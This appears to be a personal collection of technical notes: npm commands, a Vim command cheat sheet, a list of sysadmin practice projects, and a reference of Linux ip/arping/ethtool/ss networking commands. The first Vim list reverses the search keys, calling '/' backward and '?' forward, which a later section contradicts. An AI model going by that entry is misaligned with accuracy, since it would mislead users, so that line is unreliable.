--------------------------------------------------------------------------------------------------------
npm install fs-extra
npm install google-closure-compiler
npm install preprocessor

npm run test
npm run test:watch
npm run test:release
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### VIM
--------------------------------------------------------------------------------------------------------
1. Insert mode (Where you can just type like normal text editor. Press i for insert mode)
2. Command mode (Where you give commands to the editor to get things done . Press ESC for command mode)

Most of them below are in command mode

    x - to delete the unwanted character
    u - to undo the last the command and U to undo the whole line
    CTRL-R to redo
    A - to append text at the end
    :wq - to save and exit
    :q! - to trash all changes
    dw - move the cursor to the beginning of the word to delete that word
    2w - to move the cursor two words forward.
    3e - to move the cursor to the end of the third word forward.
    0 (zero) to move to the start of the line.
    d2w - which deletes 2 words .. number can be changed for deleting the number of consecutive words like d3w
    dd to delete the line and 2dd to delete to line .number can be changed for deleting the number of consecutive words

The format for a change command is: operator [number] motion
-operator - is what to do, such as d for delete
- [number] - is an optional count to repeat the motion
- motion - moves over the text to operate on, such as w (word),
$ (to the end of line), etc.

    p - puts the previously deleted text after the cursor(Type dd to delete the line and store it in a Vim register. and p to put the line)

    r - to replace the letter e.g press re to replace the letter with e

    ce - to change until the end of a word (place the cursor on the u in lubw it will delete ubw )

    ce - deletes the word and places you in Insert mode

    G - to move you to the bottom of the file.

    gg - to move you to the start of the file.
    Type the number of the line you were on and then G

    % to find a matching ),], or }

    :s/old/new/g to substitute 'new' for 'old' where g is globally

    / backward search n to find the next occurrence and N to search in opposite direction

    ? forward search

    :! to run the shell commands like :!dir, :!ls

    :w - TEST (where TEST is the filename you chose.) . Save the file

    v - starts visual mode for selecting the lines and you can perform operation on that like d delete

    :r - Filename will insert the content into the current file

    R - to replace more than one character

    y - operator to copy text using v visual mode and p to paste it

    yw - (copy)yanks one word

    o - opens a line below the cursor and start Insert mode.

    O - opens a line above the cursor.

    a - inserts text after the cursor.

    A - inserts text after the end of the line.

    e - command moves to the end of a word.

    y - operator yanks (copies) text, p puts (pastes) it.

    R - enters Replace mode until <ESC> is pressed.

    ctrl-w to jump from one window to another

type a command :e and press ctrl+D to list all the command name starts with :e and press tab to complete the command
--------------------------------------------------------------------------------------------------------
Global

:help keyword – open help for keyword
:o file – open file
:saveas file – save file as
:close – close current window

Cursor Movements

h – move cursor left
j – move cursor down
k – move cursor up
l – move cursor right
H – move to top of screen
M – move to middle of screen
L – move to bottom of screen
w – jump forwards to the start of a word
W – jump forwards to the start of a word (words can contain punctuation)
e – jump forwards to the end of a word
E – jump forwards to the end of a word (words can contain punctuation)
b – jump backwards to the start of a word
B – jump backwards to the start of a word (words can contain punctuation)
0 – jump to the start of the line
^ – jump to the first non-blank character of the line
$ – jump to the end of the line
g_ – jump to the last non-blank character of the line
gg – go to the first line of the document
G – go to the last line of the document
5G – go to line 5
fx – jump to next occurrence of character x
tx – jump to before next occurrence of character x
} – jump to next paragraph (or function/block, when editing code)
{ – jump to previous paragraph (or function/block, when editing code)
zz – center cursor on screen
Ctrl + b – move back one full screen
Ctrl + f – move forward one full screen
Ctrl + d – move forward 1/2 a screen
Ctrl + u – move back 1/2 a screen

Tip: Prefix a cursor movement command with a number to repeat it. For example, 4j moves down 4 lines.

Insert Mode

i – insert before the cursor
I – insert at the beginning of the line
a – insert (append) after the cursor
A – insert (append) at the end of the line
o – append (open) a new line below the current line
O – append (open) a new line above the current line
ea – insert (append) at the end of the word
Esc – exit insert mode

Editing

r – replace a single character
J – join line below to the current line
cc – change (replace) entire line
cw – change (replace) to the end of the word
c$ – change (replace) to the end of the line
s – delete character and substitute text
S – delete line and substitute text (same as cc)
xp – transpose two letters (delete and paste)
u – undo
Ctrl + r – redo
. – repeat last command

Marking Text (Visual Mode)

v – start visual mode, mark lines, then perform an operation (such as d-delete)
V – start linewise visual mode
Ctrl + v – start blockwise visual mode
o – move to the other end of marked area
O – move to other corner of block
aw – mark a word
ab – a block with ()
aB – a block with {}
ib – inner block with ()
iB – inner block with {}
Esc – exit visual mode

Visual Commands

> – shift text right
< – shift text left
y – yank (copy) marked text
d – delete marked text
~ – switch case

Registers

:reg – show registers content
"xy – yank into register x
"xp – paste contents of register x

Tip: Registers are being stored in ~/.viminfo, and will be loaded again on next restart of vim.

Tip: Register 0 contains always the value of the last yank command.

Marks

:marks – list of marks
ma – set current position for mark A
`a – jump to position of mark A
y`a – yank text to position of mark A

Macros

qa – record macro a
q – stop recording macro
@a – run macro a
@@ – rerun last run macro

Cut and Paste

yy – yank (copy) a line
2yy – yank (copy) 2 lines
yw – yank (copy) the characters of the word from the cursor position to the start of the next word
y$ – yank (copy) to end of line
p – put (paste) the clipboard after cursor
P – put (paste) before cursor
dd – delete (cut) a line
2dd – delete (cut) 2 lines
dw – delete (cut) the characters of the word from the cursor position to the start of the next word
D – delete (cut) to the end of the line
d$ – delete (cut) to the end of the line
x – delete (cut) character

Exiting

:w – write (save) the file, but don’t exit
:w !sudo tee % – write out the current file using sudo
:wq or :x or ZZ – write (save) and quit
:q – quit (fails if there are unsaved changes)
:q! or ZQ – quit and throw away unsaved changes

Search and Replace

/pattern – search for pattern
?pattern – search backward for pattern
\vpattern – ‘very magic’ pattern: non-alphanumeric characters are interpreted as special regex symbols (no escaping needed)
n – repeat search in same direction
N – repeat search in opposite direction
:%s/old/new/g – replace all old with new throughout file
:%s/old/new/gc – replace all old with new throughout file with confirmations
:noh – remove highlighting of search matches

Search in Multiple Files

:vimgrep /pattern/ {file} – search for pattern in multiple files
e.g.
:vimgrep /foo/ **/*
:cn – jump to the next match
:cp – jump to the previous match
:copen – open a window containing the list of matches

Working With Multiple Files

:e file – edit a file in a new buffer
:bnext or :bn – go to the next buffer
:bprev or :bp – go to the previous buffer
:bd – delete a buffer (close a file)
:ls – list all open buffers
:sp file – open a file in a new buffer and split window
:vsp file – open a file in a new buffer and vertically split window
Ctrl + ws – split window
Ctrl + ww – switch windows
Ctrl + wq – quit a window
Ctrl + wv – split window vertically
Ctrl + wh – move cursor to the left window (vertical split)
Ctrl + wl – move cursor to the right window (vertical split)
Ctrl + wj – move cursor to the window below (horizontal split)
Ctrl + wk – move cursor to the window above (horizontal split)

Tabs

:tabnew or :tabnew file – open a file in a new tab
Ctrl + wT – move the current split window into its own tab
gt or :tabnext or :tabn – move to the next tab
gT or :tabprev or :tabp – move to the previous tab
#gt – move to tab number #
:tabmove # – move current tab to the #th position (indexed from 0)
:tabclose or :tabc – close the current tab and all its windows
:tabonly or :tabo – close all tabs except for the current one
:tabdo command – run the command on all tabs (e.g. :tabdo q – closes all opened tabs)
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
### INFO
--------------------------------------------------------------------------------------------------------
Deploy an Open Source Application

Find an application that you would be interested in using and deploy it. Even if you don’t end up using the application you’ll have gained the experience of setting it up.

    Alfresco
    Bugzilla
    DokuWiki
    Drupal
    Etherpad Lite
    Gitlab
    Joomla
    MediaWiki
    Moodle
    osTicket
    OwnCloud
    phpBB
    PunBB
    Redmine
    ServiceDesk Plus
    SugarCRM
    Trac
    Twiki
    WordPress
    Zen Cart

Configure Common Services – Client AND Server

    cron
    CUPS
    DHCP
    DNS
    Email (SMTP, POP, IMAP)
    LDAP
    NFS
    NIS
    NTP
    SSH

Configure Monitoring

    Cacti
    Icinga
    Monit
    Munin
    Nagios
    OpenNMS
    Zabbix
    Zenoss

Create a Build System

    Cobbler
    FAI
    Foreman
    Kickstart
    Razor
    Spacewalk

Create a Centralized Syslog Server

    ELK Stack: Elasticsearch, Logstash & Kibana
    Fluentd
    Logstash
    Kibana
    Splunk
    syslog-ng

System Automation

    Ansible
    Chef
    MakeFiles and/or RakeFiles
    Puppet
    Salt Stack
    Write Shell Scripts

Cluster All The Things

    Load balance web servers or other services using HAProxy
    Create a MySQL Cluster
    Create a GlusterFS Cluster
    Red Hat Cluster (Conga)

Build a NAS

    NFS
    Samba

Practice Migrating Data

    Migrate data from a disk on one server to a disk on another server.
    Migrate Databases.
        Live migrations
        Export / Import

Create and Manage Users

    FreeIPA
    LDAP
    NIS
    User name ideas: http://www.fakenamegenerator.com/

Configure a Backup Server

    Amanda
    Bacula
    Rsnapshot
    Rsync + SSH

Configure a Firewall

    IPtables
    UFW

Learn LVM

    Create and restore snapshots
    Extend volumes without downtime

Configure a Proxy Server

    Forward Proxy
        Apache
        Squid
    Reverse Proxy
        Apache
        NGINX
        Pound

Learn Revision Control

    CVS
    Git
    RCS
--------------------------------------------------------------------------------------------------------
### UNIX/LINUX
--------------------------------------------------------------------------------------------------------
arping
	

Send ARP request to a neighbour host

arping -I eth0 192.168.1.1

Send ARP request to 192.168.1.1 via interface eth0

arping -D -I eth0 192.168.1.1

Check for duplicate MAC addresses at 192.168.1.1 on eth0
--------------------------------------------------------------------------------------------------------
ethtool
	

Query or control network driver and hardware settings

ethtool -g eth0

Display ring buffer for eth0

ethtool -i eth0

Display driver information for eth0

ethtool -p eth0

Identify eth0 by sight, typically by causing LEDs to blink on the network port

ethtool -S eth0

Display network and driver statistics for eth0
--------------------------------------------------------------------------------------------------------
ss
	

Display socket statistics. The below options can be combined

ss -a

Show all sockets (listening and non-listening)

ss -e

Show detailed socket information

ss -o

Show timer information

ss -n

Do not resolve addresses

ss -p

Show process using the socket
--------------------------------------------------------------------------------------------------------
arp -a = ip neigh
arp -v = ip -s neigh
arp -s 192.168.1.1 1:2:3:4:5:6 = ip neigh add 192.168.1.1 lladdr 1:2:3:4:5:6 dev eth1
arp -i eth1 -d 192.168.1.1 = ip neigh del 192.168.1.1 dev eth1
ifconfig -a = ip addr
ifconfig eth0 down = ip link set eth0 down
ifconfig eth0 up = ip link set eth0 up
ifconfig eth0 192.168.1.1 = ip addr add 192.168.1.1/24 dev eth0
ifconfig eth0 netmask 255.255.255.0 = ip addr add 192.168.1.1/24 dev eth0
ifconfig eth0 mtu 9000 = ip link set eth0 mtu 9000
ifconfig eth0:0 192.168.1.2 = ip addr add 192.168.1.2/24 dev eth0
netstat = ss
netstat -neopa = ss -neopa
netstat -g = ip maddr
route = ip route
route add -net 192.168.1.0 netmask 255.255.255.0 dev eth0 = ip route add 192.168.1.0/24 dev eth0
route add default gw 192.168.1.1 = ip route add default via 192.168.1.1
--------------------------------------------------------------------------------------------------------
neigh add
	

Add an entry to the ARP Table

ip neigh add 192.168.1.1 lladdr 1:2:3:4:5:6 dev em1

Add address 192.168.1.1 with MAC 1:2:3:4:5:6 to em1
--------------------------------------------------------------------------------------------------------
neigh del
	

Invalidate an entry

ip neigh del 192.168.1.1 dev em1

Invalidate the entry for 192.168.1.1 on em1
--------------------------------------------------------------------------------------------------------
neigh replace
	

Replace, or adds if not defined, an entry to the ARP table

ip neigh replace 192.168.1.1 lladdr 1:2:3:4:5:6 dev em1

Replace the entry for address 192.168.1.1 to use MAC 1:2:3:4:5:6 on em1
--------------------------------------------------------------------------------------------------------
route add
	

Add an entry to the routing table

ip route add default via 192.168.1.1 dev em1

Add a default route (for all addresses) via the local gateway 192.168.1.1 that can be reached on device em1

ip route add 192.168.1.0/24 via 192.168.1.1

Add a route to 192.168.1.0/24 via the gateway at 192.168.1.1

ip route add 192.168.1.0/24 dev em1

Add a route to 192.168.1.0/24 that can be reached on

device em1
--------------------------------------------------------------------------------------------------------
route delete
	

Delete a routing table entry

ip route delete 192.168.1.0/24 via 192.168.1.1

Delete the route for 192.168.1.0/24 via the gateway at 192.168.1.1
--------------------------------------------------------------------------------------------------------
route replace
	

Replace, or add if not defined, a route

ip route replace 192.168.1.0/24 dev em1

Replace the defined route for 192.168.1.0/24 to use

device em1
--------------------------------------------------------------------------------------------------------
route get
	

Display the route an address will take

ip route get 192.168.1.5

Display the route taken for IP 192.168.1.5
--------------------------------------------------------------------------------------------------------
addr add
	

Add an address

ip addr add 192.168.1.1/24 dev em1

Add address 192.168.1.1 with netmask 24 to device em1
--------------------------------------------------------------------------------------------------------
addr del
	

Delete an address

ip addr del 192.168.1.1/24 dev em1

Remove address 192.168.1.1/24 from device em1
--------------------------------------------------------------------------------------------------------
link set
	

Alter the status of the interface

ip link set em1 up

Bring em1 online

ip link set em1 down

Bring em1 offline

ip link set em1 mtu 9000

Set the MTU on em1 to 9000

ip link set em1 promisc on

Enable promiscuous mode for em1
--------------------------------------------------------------------------------------------------------
maddr add
	

Add a static link-layer multicast address

ip maddr add 33:33:00:00:00:01 dev em1

Add mutlicast address 33:33:00:00:00:01 to em1
--------------------------------------------------------------------------------------------------------
maddr del
	

Delete a multicast address

ip maddr del 33:33:00:00:00:01 dev em1

Delete address 33:33:00:00:00:01 from em1
--------------------------------------------------------------------------------------------------------
addr
	

Display IP Addresses and property information (abbreviation of address)

ip addr

Show information for all addresses

ip addr show dev em1

Display information only for device em1
--------------------------------------------------------------------------------------------------------
link
	

Manage and display the state of all network interfaces

ip link

Show information for all interfaces

ip link show dev em1

Display information only for device em1

ip -s link

Display interface statistics
--------------------------------------------------------------------------------------------------------
route  
	

Display and alter the routing table

ip route

List all of the route entries in the kernel
--------------------------------------------------------------------------------------------------------
maddr
	

Manage and display multicast IP addresses

ip maddr

Display multicast information for all devices

ip maddr show dev em1

Display multicast information for device em1
--------------------------------------------------------------------------------------------------------
neigh
	

Show neighbour objects; also known as the ARP table for IPv4

ip neigh

Display neighbour objects

ip neigh show dev em1

Show the ARP cache for device em1
--------------------------------------------------------------------------------------------------------
help
	

Display a list of commands and arguments for each subcommand

ip help

Display ip commands and arguments

ip addr help

Display address commands and arguments

ip link help

Display link commands and arguments

ip neigh help

Display neighbour commands and arguments
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------